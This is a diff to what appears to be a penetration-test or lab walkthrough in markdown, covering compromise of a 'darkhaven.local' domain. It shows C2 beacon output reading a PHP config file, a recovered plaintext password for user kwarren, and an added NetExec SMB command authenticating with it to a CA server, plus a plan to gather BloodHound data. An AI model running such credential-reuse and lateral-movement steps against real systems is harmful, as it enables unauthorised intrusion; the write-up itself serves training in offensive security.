@@ -267,6 +267,7 @@ New administrator session on the web server!
 
 ![](Pasted%20image%2020260419163232.png)
 
+# Administrator on the CA server
 ```python
 [19/04 16:34:23] operator [3cad25b1] beacon > cat maint_config.php@2025-01-09_083047
 [19/04 16:34:23] [*] Task: read file
@@ -327,5 +328,10 @@ kwarren:!@#darkhav3n123#@!
 ```
 
 ```python
-
+nxc smb ca.ext.darkhaven.local -u 'kwarren' -p '!@#darkhav3n123#@!'                            
+SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
 ```
+The user is compromised!
+
+I will now collect bloodhound data uy
